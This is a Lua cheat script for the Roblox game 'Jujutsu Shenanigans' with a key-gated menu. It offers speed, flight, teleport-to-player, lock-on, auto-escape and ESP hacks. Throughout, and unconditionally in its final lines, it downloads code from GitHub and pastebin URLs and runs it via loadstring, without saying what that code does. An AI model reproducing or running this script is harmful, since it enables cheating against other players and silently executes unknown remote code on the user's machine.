local players = game:GetService("Players")
local runService = game:GetService("RunService")
local tweenService = game:GetService("TweenService")
local starterGui = game:GetService("StarterGui")
local userInputService = game:GetService("UserInputService")
local dist = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()

local function f1(p1)
  local v1 = p1
  local text = ""
  local count = 0

  while true do
    count = 1 + count

    if not (count <= 8) then
      break
    end

    local v2 = v1 % 16
    text = string.sub("0123456789ABCDEF", v2 + 1, v2 + 1) .. text
    v1 = (v1 - v2) / 16
  end

  return text
end

local function f2(p2)
  local v3 = tostring(p2) .. ":" .. "KkNTLRKqziEYmZAhzh7zru5uAspe" .. ":" .. tostring(p2)
  local v4 = 5381
  local v5 = 52711

  for i = 1, 3 do
    for j = 1, #v3 do
      local v6 = string.byte(v3, j)
      v4 = (v4 * 33 + v6 + math.floor(v4 / 65536)) % 4294967296
      v5 = (v5 * 31 + v6 * 7 + math.floor(v5 / 8192) + v4 % 977) % 4294967296
    end
  end

  local v7 = f1(v4) .. f1(v5)

  return string.sub(v7, 1, 4) .. "-" .. string.sub(v7, 5, 8) .. "-" .. string.sub(v7, 9, 12)
    .. "-" .. string.sub(v7, 13, 16)
end

local v8 = {}

dist:AddTheme({
  Name = "Shenanigans",
  Background = dist:Gradient({
    ["0"] = { Color = Color3.fromHex("#1c1316"), Transparency = 0 },
    ["100"] = { Color = Color3.fromHex("#13131f"), Transparency = 0 },
  }, { Rotation = 45 }),
  Accent = Color3.fromHex("#1b1519"),
  Dialog = Color3.fromHex("#17151d"),
  Outline = Color3.fromRGB(111, 111, 185),
  Text = Color3.fromHex("#f0e8ec"),
  Placeholder = Color3.fromHex("#8a8098"),
  Button = Color3.fromHex("#3a2630"),
  Icon = Color3.fromRGB(185, 111, 111),
  Toggle = Color3.fromRGB(185, 111, 111),
  Slider = Color3.fromRGB(111, 111, 185),
  Checkbox = Color3.fromRGB(185, 111, 111),
  Primary = Color3.fromRGB(185, 111, 111),
  PanelBackground = Color3.fromRGB(111, 111, 185),
  PanelBackgroundTransparency = 0.95,
  LabelBackground = Color3.fromHex("#000000"),
  LabelBackgroundTransparency = 1,
})

pcall(function() dist:SetFont("rbxasset://fonts/families/FredokaOne.json") end)

local jujutsuShenanigansWindow = dist:CreateWindow({
  Title = "Jujutsu Shenanigans",
  Icon = "sparkles",
  Theme = "Shenanigans",
  Folder = "jjs",
  KeySystem = {
    Title = "Get Your Key",
    Note = "Click <b>Get Key</b> to copy the link, then paste it into your browser (Ctrl + V). Complete it to get your key and paste the key here. Keys last up to 2 hours.",
    URL = "https://pantheon111.github.io/keys/?game=jjs",
    KeyValidator = function(p3)
      local gsub = string.gsub
      local v9 = string.upper(gsub(tostring(p3 or ""), "%s", ""))

      if v8[v9] then
        return true
      else
        local v10 = math.floor(os.time() / 3600)
        return v9 == f2(v10) or v9 == f2(v10 - 1)
      end
    end,
    SaveKey = true,
  },
  Background = "https://raw.githubusercontent.com/pantheon111/jjs/main/gojo.jpg",
  BackgroundImageTransparency = 0.55,
  Size = UDim2.fromOffset(620, 440),
  Radius = 8,
  SideBarWidth = 180,
  NewElements = true,
  HideSearchBar = true,
  ShadowTransparency = 0.4,
  ToggleKey = Enum.KeyCode.RightAlt,
  Topbar = { Height = 44, ButtonsType = "Default" },
  OpenButton = {
    Title = "Open",
    Enabled = true,
    Draggable = true,
    OnlyMobile = true,
    CornerRadius = UDim.new(0, 6),
    StrokeThickness = 2,
    Color = ColorSequence.new(Color3.fromRGB(185, 111, 111), Color3.fromRGB(111, 111, 185)),
  },
})

local function f3(p4)
  local v11 = {}

  function v11:Label(title)
    return p4:Section({ Title = title, TextSize = 15, TextTransparency = 0.4 })
  end

  function v11:Button(title2, p5, p6)
    local callback = p6
    local v12 = p5

    if type(v12) == "function" then
      callback = v12
      v12 = nil
    end

    return p4:Button({ Title = title2, Desc = v12, Callback = callback })
  end

  function v11:Toggle(title3, p7, p8)
    local v13 = p7
    local v14 = p8

    if type(v13) == "function" then
      local v15 = v13
      v13 = nil
      v14 = v15
    end

    local v16 = false

    return p4:Toggle({
      Title = title3,
      Desc = v13,
      Value = false,
      Callback = function(value)
        if value ~= v16 then
          v16 = value
          task.spawn(v14, value)
        end
      end,
    })
  end

  function v11:Slider(title4, p9, p10, p11, step, fn)
    local v17 = false

    local slider = p4:Slider({
      Title = title4,
      Step = step,
      Value = { Min = p10, Max = p11, Default = math.clamp(p9, p10, p11) },
      Callback = function(value2)
        if v17 then
          fn(tonumber(value2) or value2)
        end
      end,
    })

    task.delay(0.5, function() v17 = true end)
    return slider
  end

  function v11:Banner(p12, p13)
    if not p12 or p12 == "" then
      return
    end

    pcall(function()
      p4:Image({ Image = "rbxassetid://" .. tostring(p12), AspectRatio = "16:9", Radius = 8 })
    end)
  end

  return v11
end

local v18 = f3(jujutsuShenanigansWindow:Tab({ Title = "Home", Icon = "house" }))
local v19 = f3(jujutsuShenanigansWindow:Tab({ Title = "Main", Icon = "swords" }))
local v20 = f3(jujutsuShenanigansWindow:Tab({ Title = "Protection", Icon = "shield" }))
local v21 = f3(jujutsuShenanigansWindow:Tab({ Title = "Fun", Icon = "sparkles" }))
local v22 = f3(jujutsuShenanigansWindow:Tab({ Title = "Others", Icon = "wrench" }))
local v23 = f3(jujutsuShenanigansWindow:Tab({ Title = "Info", Icon = "info" }))
v19:Label("Main Features.")
v20:Label("Protection Features.")
v21:Label("Fun Features.")
v22:Label("Other Features.")

v23:Label("GUI Controls Are Below.")
v23:Label("Show / Hide GUI: Right Alt")

v18:Banner("", 185)

getgenv().lastSliderSet = nil
getgenv().tpWalkConnection = nil

getgenv().applyTPWalk = function()
  local character, humanoidRootPart, humanoid

  if not getgenv().lastSliderSet then
    return
  else
    local localPlayer = players.LocalPlayer
    character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoid = character:WaitForChild("Humanoid")

    if getgenv().tpWalkConnection then
      getgenv().tpWalkConnection:Disconnect()
    end

    local v24 = getgenv()

    v24.tpWalkConnection = runService.Heartbeat:Connect(function(delta)
      if not character or not character:FindFirstChild("HumanoidRootPart") then
        return
      end

      if humanoid.MoveDirection.Magnitude > 0 then
        humanoidRootPart.CFrame = humanoidRootPart.CFrame
          + humanoid.MoveDirection * getgenv().lastSliderSet * delta
      end
    end)

    return
  end
end

v19:Slider("Player Speed", 19.5, 1, 85, 1, function(p14)
  local v25 = getgenv()
  v25.lastSliderSet = p14 == 8 and 16 or p14
  getgenv().applyTPWalk()
end)

players.LocalPlayer.CharacterAdded:Connect(function(character2)
  character2:WaitForChild("Humanoid"):GetPropertyChangedSignal("Parent"):Connect(function()
    getgenv().applyTPWalk()
  end)

  getgenv().applyTPWalk()
end)

getgenv().lastJumpSet = nil

v19:Slider("Player Jump", 10, 50, 300, 1, function(lastJumpSet)
  getgenv().lastJumpSet = lastJumpSet
end)

local localPlayer2 = players.LocalPlayer

local function f4(p15)
  local humanoidRootPart2 = p15:WaitForChild("HumanoidRootPart")

  p15:WaitForChild("Humanoid").StateChanged:Connect(function(p16, p17)
    if p17 == Enum.HumanoidStateType.Jumping and getgenv().lastJumpSet then
      task.defer(function()
        humanoidRootPart2.Velocity = Vector3.new(0, getgenv().lastJumpSet, 0)
      end)
    end
  end)
end

if localPlayer2.Character then
  f4(localPlayer2.Character)
end

localPlayer2.CharacterAdded:Connect(f4)
local v26 = false
local currentCamera = workspace.CurrentCamera
local tweenInfo = TweenInfo.new(0.65, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local v27 = 70
local connect, loadAnimation, loadAnimation2, sound, bodyVelocity, bodyGyro, create

v19:Toggle("Flight", function()
  v26 = not v26

  starterGui:SetCore("SendNotification", {
    Title = "Flight",
    Text = v26 and "Enabled." or "Disabled.",
    Duration = 2,
  })

  if connect then
    connect:Disconnect()
    connect = nil
  end

  local localPlayer3 = players.LocalPlayer
  local character3 = localPlayer3.Character or localPlayer3.CharacterAdded:Wait()
  local humanoidRootPart3 = character3:WaitForChild("HumanoidRootPart")
  local humanoid2 = character3:WaitForChild("Humanoid")

  if create then
    create:Cancel()
    create = nil
  end

  v27 = 70

  if loadAnimation then
    loadAnimation:Stop()
    loadAnimation = nil
  end

  if loadAnimation2 then
    loadAnimation2:Stop()
    loadAnimation2 = nil
  end

  if sound then
    sound:Destroy()
    sound = nil
  end

  if bodyVelocity then
    bodyVelocity:Destroy()
    bodyVelocity = nil
  end

  if bodyGyro then
    bodyGyro:Destroy()
    bodyGyro = nil
  end

  local zero, v28

  if v26 then
    humanoid2.PlatformStand = true

    local animation = Instance.new("Animation")
    animation.AnimationId = "rbxassetid://15984964491"

    loadAnimation = humanoid2:LoadAnimation(animation)
    loadAnimation.Looped = true
    loadAnimation:Play()
    loadAnimation.TimePosition = 0.7
    loadAnimation:AdjustSpeed(0)

    local animation2 = Instance.new("Animation")
    animation2.AnimationId = "rbxassetid://91428863336534"

    loadAnimation2 = humanoid2:LoadAnimation(animation2)
    loadAnimation2.Looped = true

    sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://3308152153"
    sound.Looped = true
    sound.Volume = 1
    sound.Parent = humanoidRootPart3
    sound:Play()

    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(100000, 100000, 100000)
    bodyVelocity.Velocity = Vector3.zero
    bodyVelocity.Parent = humanoidRootPart3

    bodyGyro = Instance.new("BodyGyro")
    bodyGyro.MaxTorque = Vector3.new(1000000, 1000000, 1000000)
    bodyGyro.P = 100000
    bodyGyro.CFrame = humanoidRootPart3.CFrame
    bodyGyro.Parent = humanoidRootPart3

    zero = Vector3.zero
    v28 = 165

    connect = runService.RenderStepped:Connect(function(delta2)
      local zero2 = Vector3.zero

      if not userInputService:GetFocusedTextBox() then
        if userInputService:IsKeyDown(Enum.KeyCode.W) then
          zero2 = zero2 + currentCamera.CFrame.LookVector
        end

        if userInputService:IsKeyDown(Enum.KeyCode.S) then
          zero2 = zero2 - currentCamera.CFrame.LookVector
        end

        if userInputService:IsKeyDown(Enum.KeyCode.A) then
          zero2 = zero2 - currentCamera.CFrame.RightVector
        end

        if userInputService:IsKeyDown(Enum.KeyCode.D) then
          zero2 = zero2 + currentCamera.CFrame.RightVector
        end
      end

      v28 = 165
      zero = zero:Lerp(zero2.Magnitude > 0 and zero2.Unit * v28 or Vector3.zero, 0.25)
      bodyVelocity.Velocity = zero

      bodyGyro.CFrame = CFrame.new(
        humanoidRootPart3.Position, humanoidRootPart3.Position + currentCamera.CFrame.LookVector
      )

      local v29 = zero2.Magnitude > 0 and 145 or 70

      if v29 ~= v27 then
        v27 = v29

        if create then
          create:Cancel()
        end

        create = tweenService:Create(currentCamera, tweenInfo, { FieldOfView = v29 })
        create:Play()
      end

      if zero.Magnitude < 1 then
        if loadAnimation.IsPlaying then
          loadAnimation:Stop()
        end

        if not loadAnimation2.IsPlaying then
          loadAnimation2:Play()
        end

        sound.Volume = 1
      else
        if loadAnimation2.IsPlaying then
          loadAnimation2:Stop()
        end

        if not loadAnimation.IsPlaying then
          loadAnimation:Play()
          loadAnimation.TimePosition = 0.7
          loadAnimation:AdjustSpeed(0)
        end

        sound.Volume = 3
      end
    end)
  else
    humanoid2.PlatformStand = false

    if loadAnimation then
      loadAnimation:Stop()
      loadAnimation = nil
    end

    if loadAnimation2 then
      loadAnimation2:Stop()
      loadAnimation2 = nil
    end

    if sound then
      sound:Destroy()
      sound = nil
    end

    if bodyVelocity then
      bodyVelocity:Destroy()
      bodyVelocity = nil
    end

    if bodyGyro then
      bodyGyro:Destroy()
      bodyGyro = nil
    end

    if create then
      create:Cancel()
    end

    v27 = 70

    create = tweenService:Create(currentCamera, tweenInfo, { FieldOfView = 70 })
    create:Play()
  end
end)

local v30 = false
local currentCamera2 = workspace.CurrentCamera
local localPlayer4 = players.LocalPlayer
local humanoidRootPart4, connect2, connect3

v19:Toggle("Lock On", function()
  v30 = not v30

  starterGui:SetCore("SendNotification", {
    Title = "Lock On",
    Text = v30 and "Enabled." or "Disabled.",
    Duration = 2,
  })

  if v30 then
    connect2 = userInputService.InputBegan:Connect(function(input, p18)
      if p18 then
        return
      elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
        if humanoidRootPart4 then
          humanoidRootPart4 = nil
          return
        else
          local character4 = localPlayer4.Character
          local humanoidRootPart5 = character4 and character4:FindFirstChild("HumanoidRootPart")

          if not humanoidRootPart5 then
            return
          else
            local v31 = nil
            local huge = math.huge

            for index, value3 in ipairs(players:GetPlayers()) do
              if value3 ~= localPlayer4 and value3.Character
                and value3.Character:FindFirstChild("HumanoidRootPart") then
                local magnitude = (humanoidRootPart5.Position
                  - value3.Character.HumanoidRootPart.Position).Magnitude

                if magnitude < huge then
                  huge = magnitude
                  v31 = value3
                end
              end
            end

            if v31 then
              humanoidRootPart4 = v31.Character:FindFirstChild("HumanoidRootPart")
            end

            return
          end
        end
      else
        return
      end
    end)

    connect3 = runService.RenderStepped:Connect(function()
      if humanoidRootPart4 then
        currentCamera2.CFrame = CFrame.new(
          currentCamera2.CFrame.Position, humanoidRootPart4.Position
        )
      end
    end)
  else
    humanoidRootPart4 = nil

    if connect2 then
      connect2:Disconnect()
      connect2 = nil
    end

    if connect3 then
      connect3:Disconnect()
      connect3 = nil
    end
  end
end)

v19:Toggle("Flash Step Technique", function(flashStepEnabled)
  _G.FlashStepEnabled = flashStepEnabled
end)

if not _G.FlashStepSound then
  _G.FlashStepSound = Instance.new("Sound")
  _G.FlashStepSound.SoundId = "rbxassetid://108156899947106"
end

_G.FlashStepSound.Volume = 10
local v32 = game

_G.FlashStepSound.Parent = v32:GetService("SoundService")

function _G.GetClosestPlayer()
  local v33 = 50
  local character5 = players.LocalPlayer.Character
  local v34 = not character5
  local v35

  if v34 or not character5:FindFirstChild("HumanoidRootPart") then
    return nil
  else
    local humanoidRootPart6 = character5.HumanoidRootPart

    for index2, value4 in ipairs(players:GetPlayers()) do
      if value4 ~= players.LocalPlayer then
        local character6 = value4.Character

        if character6 and character6:FindFirstChild("HumanoidRootPart")
          and character6:FindFirstChildOfClass("Humanoid") and character6.Humanoid.Health > 0 then
          local magnitude2 = (humanoidRootPart6.Position - character6.HumanoidRootPart.Position).Magnitude

          if magnitude2 < v33 then
            v33 = magnitude2
            v35 = value4
          end
        end
      end
    end

    return v35
  end
end

if _G.FlashStepConnection then
  _G.FlashStepConnection:Disconnect()
end

_G.FlashStepConnection = userInputService.InputBegan:Connect(function(input2, p19)
  if p19 then
    return
  elseif not _G.FlashStepEnabled then
    return
  elseif input2.KeyCode == Enum.KeyCode.T then
    local character7 = players.LocalPlayer.Character

    if not character7 or not character7:FindFirstChild("HumanoidRootPart") then
      return
    end

    local g = _G.GetClosestPlayer()

    if g and g.Character and g.Character:FindFirstChild("HumanoidRootPart") then
      _G.FlashStepSound:Play()

      character7.HumanoidRootPart.CFrame = g.Character.HumanoidRootPart.CFrame
        * CFrame.new(0, 0, 2)
    end

    return
  else
    return
  end
end)

v21:Button("Invade Domain (Look At Domain.)", function()
  local humanoidRootPart7 = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")

  humanoidRootPart7.CFrame = humanoidRootPart7.CFrame
    + workspace.CurrentCamera.CFrame.LookVector * 10
end)

v21:Button("Call Train", function()
  local localPlayer5 = players.LocalPlayer

  local humanoidRootPart8 = (localPlayer5.Character or localPlayer5.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
  humanoidRootPart8:SetAttribute("ReturnPosition", humanoidRootPart8.Position)

  local button = workspace:WaitForChild("Map"):WaitForChild("Destructible"):WaitForChild("Model"):WaitForChild("StationControl"):WaitForChild("ButtonTrain"):WaitForChild("Button")
  humanoidRootPart8.CFrame = button.CFrame + Vector3.new(0, 3, 0)
  task.wait(0.1)
  local proximityPrompt = button:FindFirstChildWhichIsA("ProximityPrompt")

  if proximityPrompt then
    proximityPrompt.HoldDuration = 0
    fireproximityprompt(proximityPrompt)
  end

  task.wait(1)
  local returnPosition = humanoidRootPart8:GetAttribute("ReturnPosition")

  if returnPosition then
    humanoidRootPart8.CFrame = CFrame.new(returnPosition)
  end
end)

escapeEnabled = false
escapeConnection = nil

v20:Toggle("Anti Damage", function()
  escapeEnabled = not escapeEnabled

  starterGui:SetCore("SendNotification", {
    Title = "Anti Damage",
    Text = escapeEnabled and "Enabled." or "Disabled.",
    Duration = 2,
  })

  if escapeEnabled then
    if escapeConnection then
      escapeConnection:Disconnect()
    end

    local character8 = players.LocalPlayer.Character
    local humanoid3 = character8 and character8:FindFirstChildOfClass("Humanoid")
    lastHealth = humanoid3 and humanoid3.Health or 100

    escapeConnection = runService.Heartbeat:Connect(function()
      char = players.LocalPlayer.Character
      hum = char and char:FindFirstChildOfClass("Humanoid")
      hrp = char and char:FindFirstChild("HumanoidRootPart")

      if not hum or not hrp then
        return
      end

      if hum.Health < lastHealth then
        closest = nil
        shortest = math.huge

        for index3, value5 in ipairs(players:GetPlayers()) do
          if value5 ~= players.LocalPlayer and value5.Character
            and value5.Character:FindFirstChild("HumanoidRootPart") then
            d = (hrp.Position - value5.Character.HumanoidRootPart.Position).Magnitude

            if d < shortest then
              shortest = d
              closest = value5
            end
          end
        end

        if closest and closest.Character
          and closest.Character:FindFirstChild("HumanoidRootPart") then
          dir = (hrp.Position - closest.Character.HumanoidRootPart.Position).Unit
          hrp.CFrame = CFrame.new(hrp.Position + dir * 20 + Vector3.new(0, 25, 0))
        end
      end

      lastHealth = hum.Health
    end)
  elseif escapeConnection then
    escapeConnection:Disconnect()
    escapeConnection = nil
  end
end)

local v36 = false
local v37 = 0
local v38 = {}

for index4, value6 in ipairs({
  "rbxassetid://132725601768618", "rbxassetid://118861398234801", "rbxassetid://73048386765082",
  "rbxassetid://80922461169812", "rbxassetid://121984128639453", "rbxassetid://125335594549446",
  "rbxassetid://83241775239139", "rbxassetid://101617544363219", "rbxassetid://105801749091005",
  "rbxassetid://75736902190737", "rbxassetid://115561023870463",
}) do
  local v39 = string.match(value6, "%d+")

  if v39 then
    v38[v39] = true
  end
end

v20:Toggle("Anti Domain", function()
  v36 = not v36

  starterGui:SetCore("SendNotification", {
    Title = "Anti Domain",
    Text = v36 and "Enabled." or "Disabled.",
    Duration = 2,
  })
end)

local localPlayer6 = players.LocalPlayer
local v40, position, v41

local function f5(p20)
  local character9 = localPlayer6.Character
  local humanoidRootPart9 = character9 and character9:FindFirstChild("HumanoidRootPart")
  local humanoidRootPart10 = p20 and p20:FindFirstChild("HumanoidRootPart")

  if humanoidRootPart9 and humanoidRootPart10 and not v40 then
    if (humanoidRootPart9.Position - humanoidRootPart10.Position).Magnitude <= 60 then
      local unit = (humanoidRootPart9.Position - humanoidRootPart10.Position).Unit

      if unit.Magnitude == 0 or unit ~= unit then
        unit = humanoidRootPart9.CFrame.LookVector * -1
      end

      local position2 = humanoidRootPart10.Position
      v40 = p20
      position = humanoidRootPart9.Position
      v41 = position2 + unit * 85
      v37 = 0
    end
  end
end

local function f6(p21, p22)
  p21.AnimationPlayed:Connect(function(p23)
    if not v36 then
      return
    else
      local animationId = p23.Animation and p23.Animation.AnimationId

      if animationId then
        if v38[string.match(animationId, "%d+")] then
          f5(p22)
        end
      end

      return
    end
  end)
end

local function f7(p24, p25)
  if not p25 then
    return
  else
    local waitForChild = p25:WaitForChild("Humanoid", 5)
      or p25:FindFirstChildOfClass("Humanoid")

    if waitForChild then
      local waitForChild2 = waitForChild:WaitForChild("Animator", 5)
        or waitForChild:FindFirstChildOfClass("Animator")

      if waitForChild2 then
        f6(waitForChild2, p25)
      end
    end

    return
  end
end

local function f8(p26)
  if p26 == localPlayer6 then
    return
  end

  if p26.Character then
    task.spawn(f7, p26, p26.Character)
  end

  p26.CharacterAdded:Connect(function(character10) f7(p26, character10) end)
end

for index5, value7 in ipairs(players:GetPlayers()) do
  f8(value7)
end

players.PlayerAdded:Connect(f8)

runService.RenderStepped:Connect(function(delta3)
  local character11 = localPlayer6.Character
  local humanoidRootPart11 = character11 and character11:FindFirstChild("HumanoidRootPart")

  if not v36 or not character11 or not humanoidRootPart11 then
    return
  end

  if v40 then
    if v37 < 0.8 then
      v37 = v37 + delta3
      local v42 = v40
      local v43 = math.clamp(v37 / 0.8, 0, 1)

      if v42:FindFirstChild("HumanoidRootPart") and position and v41 then
        humanoidRootPart11.CFrame = CFrame.new(
          position, position + humanoidRootPart11.CFrame.LookVector
        ):Lerp(CFrame.new(v41, v41
          + humanoidRootPart11.CFrame.LookVector), v43)
      end
    else
      v40 = nil
      position = nil
      v41 = nil
      v37 = 0
    end
  end
end)

local part = Instance.new("Part")
part.Size = Vector3.new(20000, 10, 20000)
part.Position = Vector3.new(-18, -52, -135)
part.Anchored = true
part.Transparency = 1
part.CanCollide = false
part.Parent = workspace

v20:Toggle("Anti Void", function(p27)
  if p27 then
    part.CanCollide = true
  else
    part.CanCollide = false
  end
end)

v21:Toggle("Climb Walls", function()
  getgenv().climbWallsEnabled = not getgenv().climbWallsEnabled

  starterGui:SetCore("SendNotification", {
    Title = "Climb Walls",
    Text = getgenv().climbWallsEnabled and "Enabled." or "Disabled.",
    Duration = 2,
  })

  if getgenv().climbWallsConnection then
    getgenv().climbWallsConnection:Disconnect()
    getgenv().climbWallsConnection = nil
  end

  if getgenv().climbWallsEnabled then
    local v44 = getgenv()

    v44.climbWallsConnection = runService.RenderStepped:Connect(function()
      if not players.LocalPlayer.Character then
        return
      end

      if not players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return
      end

      if not players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
        return
      else
        local v45 = false

        if userInputService:IsKeyDown(Enum.KeyCode.W)
          or userInputService:IsKeyDown(Enum.KeyCode.Up) then
          local v46 = workspace
          local v47 = game
          local v48 = game

          local function f9()
            local raycastParams = RaycastParams.new()
            raycastParams.FilterDescendantsInstances = { players.LocalPlayer.Character }
            raycastParams.FilterType = Enum.RaycastFilterType.Blacklist

            return raycastParams
          end

          local raycast = v46:Raycast(v47:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
            + Vector3.new(0, 2, 0), v48:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector
            * 2, f9())

          if raycast and raycast.Normal.Y == 0 then
            local v49 = game
            v49:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = false

            local v50 = game

            v50:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
              0, 25, 0
            )

            local v51 = game
            v45 = true

            if v51:GetService("Players").LocalPlayer.Character:FindFirstChild("Animate") then
              if players.LocalPlayer.Character.Animate:FindFirstChild("fall") then
                players.LocalPlayer.Character.Animate.fall:Destroy()
              end
            end

            if not players.LocalPlayer.Character:FindFirstChild("ClimbAnim") then
              local climbAnim = Instance.new("Animation")
              climbAnim.AnimationId = "rbxassetid://180436334"
              climbAnim.Name = "ClimbAnim"
              climbAnim.Parent = players.LocalPlayer.Character
            end

            local v52 = false

            for index6, value8 in ipairs(players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks()) do
              if value8.Animation.AnimationId == "rbxassetid://180436334" then
                v52 = true
              end

              if value8.Animation.AnimationId == "rbxassetid://180436117" then
                value8:Stop()
              end
            end

            if not v52 then
              players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(players.LocalPlayer.Character:FindFirstChild("ClimbAnim")):Play()
            end
          end
        end

        if not v45 then
          for index7, value9 in ipairs(players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks()) do
            if value9.Animation.AnimationId == "rbxassetid://180436334" then
              value9:Stop()
            end
          end
        end

        return
      end
    end)
  end
end)

local v53 = false

v21:Toggle("Item ESP", function()
  v53 = not v53

  for index8, value10 in ipairs(workspace.Items:GetDescendants()) do
    if value10:IsA("BasePart") then
      local itemESPHighlight = value10:FindFirstChild("ItemESPHighlight")

      if v53 then
        if not itemESPHighlight then
          local itemESPHighlight2 = Instance.new("Highlight")
          itemESPHighlight2.Name = "ItemESPHighlight"
          itemESPHighlight2.FillColor = Color3.fromRGB(255, 0, 0)
          itemESPHighlight2.FillTransparency = 0.5
          itemESPHighlight2.OutlineTransparency = 1
          itemESPHighlight2.Adornee = value10
          itemESPHighlight2.Parent = value10
        end
      elseif itemESPHighlight then
        itemESPHighlight:Destroy()
      end
    end
  end

  starterGui:SetCore("SendNotification", {
    Title = "Item ESP",
    Text = v53 and "Enabled." or "Disabled.",
    Duration = 2,
  })
end)

v22:Button("Infinite Yield", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

v22:Button("Rejoin Server", function()
  TeleportService:TeleportToPlaceInstance(PlaceId, JobId, localPlayer6)
end)

v22:Button("Switch Servers", function()
  local v54 = {}

  local v55, v56 = pcall(function()
    return game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId
      .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
  end)

  if v55 then
    local jsonDecode = HttpService:JSONDecode(v56)

    if jsonDecode and jsonDecode.data then
      for key, value11 in next, jsonDecode.data, nil do
        if type(value11) == "table" and tonumber(value11.playing)
          and tonumber(value11.maxPlayers) and value11.playing < value11.maxPlayers
          and value11.id ~= JobId then
          table.insert(v54, 1, value11.id)
        end
      end
    end
  end

  if #v54 > 0 then
    TeleportService:TeleportToPlaceInstance(PlaceId, v54[math.random(1, #v54)], localPlayer6)
  end
end)

v22:Button("Shutdown Game", function() game:Shutdown() end)

loadstring(game:HttpGet(
  "https://raw.githubusercontent.com/ghostofcelleron/Scripts/refs/heads/main/oldthingyep", true
))()

loadstring(game:HttpGet("https://pastebin.com/raw/rQMS2B9R", true))()
